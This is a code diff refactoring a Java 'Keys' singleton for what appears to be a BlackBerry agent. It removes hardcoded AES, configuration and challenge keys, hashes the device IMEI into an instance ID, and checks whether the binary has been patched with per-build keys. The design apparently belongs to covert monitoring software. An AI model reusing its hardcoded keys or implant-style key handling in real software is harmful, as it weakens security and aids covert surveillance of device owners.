@@ -18,23 +18,11 @@ import blackberry.utils.Utils;
  * The Class Keys.
  */
 public final class Keys implements Singleton {
-    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
-    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
-    // logjava
-    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
-    private static String buildID = "av3pVck1gb4eR2d8";
-
-    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
-    private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar
-
-    private static byte[] byteAesKey;
-    private static byte[] byteChallengeKey;
-    private static byte[] byteConfKey;
-    private static byte[] byteConfNameKey;
-    private static byte[] byteInstanceID;
-
+   
     static Keys instance = null;
 
+    static InstanceKeys instanceKeys;
+    
     /**
      * Gets the single instance of Keys.
      * 
@@ -54,13 +42,24 @@ public final class Keys implements Singleton {
      * @return true, if successful
      */
     public static boolean hasBeenBinaryPatched() {
-        return !buildID.equals("av3pVck1gb4eR2d8");
-    }
+        return instanceKeys.hasBeenBinaryPatched();
+    }        
 
     private Keys() {
         final byte[] imei = GPRSInfo.getIMEI();
-        byteInstanceID = Encryption.SHA1(imei);
-        instanceID = Utils.byteArrayToHex(byteInstanceID);
+        
+        byte[] byteInstanceID = Encryption.SHA1(imei);
+        String instanceID = Utils.byteArrayToHex(byteInstanceID);
+        
+        instanceKeys=new InstanceKeys(byteInstanceID, instanceID);
+    }
+    
+    public void setInstanceKeys(InstanceKeysEmbedded embeddedKeys){
+        embeddedKeys.injectKeys(instanceKeys);
+    }
+    
+    public InstanceKeys getInstanceKeys(){
+        return instanceKeys;
     }
 
     /**
@@ -69,10 +68,7 @@ public final class Keys implements Singleton {
      * @return the aes key
      */
     public byte[] getAesKey() {
-        if (byteAesKey == null) {
-            byteAesKey = keyFromString(aes);
-        }
-        return byteAesKey;
+        return instanceKeys.getAesKey();
     }
 
     /**
@@ -81,7 +77,7 @@ public final class Keys implements Singleton {
      * @return the builds the id
      */
     public byte[] getBuildId() {
-        return buildID.getBytes();
+        return instanceKeys.getBuildId();
     }
 
     /**
@@ -90,11 +86,7 @@ public final class Keys implements Singleton {
      * @return the challenge key
      */
     public byte[] getChallengeKey() {
-        if (byteChallengeKey == null) {
-            byteChallengeKey = keyFromString(challenge);
-        }
-
-        return byteChallengeKey;
+        return instanceKeys.getChallengeKey();
     }
 
     /**
@@ -103,11 +95,7 @@ public final class Keys implements Singleton {
      * @return the conf key
      */
     public byte[] getConfKey() {
-        if (byteConfKey == null) {
-            byteConfKey = keyFromString(conf);
-        }
-
-        return byteConfKey;
+        return instanceKeys.getConfKey();
     }
 
     /**
@@ -116,11 +104,7 @@ public final class Keys implements Singleton {
      * @return the conf name key
      */
     public byte[] getConfNameKey() {
-        if (byteConfNameKey == null) {
-            byteConfNameKey = keyFromString(confName);
-        }
-
-        return byteConfNameKey;
+        return instanceKeys.getConfNameKey();
     }
 
     /**
@@ -129,54 +113,7 @@ public final class Keys implements Singleton {
      * @return the instance id
      */
     public byte[] getInstanceId() {
-
-        return byteInstanceID;
-    }
-
-    private byte[] keyFromString(final String string) {
-        final byte[] key = new byte[16];
-        Utils.copy(key, 0, string.getBytes(), 0, 16);
-        return key;
-    }
-
-    /**
-     * Sets the aes key.
-     * 
-     * @param key
-     *            the new aes key
-     */
-    public void setAesKey(final byte[] key) {
-        byteAesKey = key;
-    }
-
-    /**
-     * Sets the builds the id.
-     * 
-     * @param build
-     *            the new builds the id
-     */
-    public void setBuildID(final String build) {
-        buildID = build;
-    }
-
-    /**
-     * Sets the challenge key.
-     * 
-     * @param challenge_
-     *            the new challenge key
-     */
-    public void setChallengeKey(final byte[] challenge_) {
-        byteChallengeKey = challenge_;
-    }
-
-    /**
-     * Sets the conf key.
-     * 
-     * @param conf_
-     *            the new conf key
-     */
-    public void setConfKey(final byte[] conf_) {
-        byteConfKey = conf_;
+        return instanceKeys.getInstanceId();
     }
 
 }
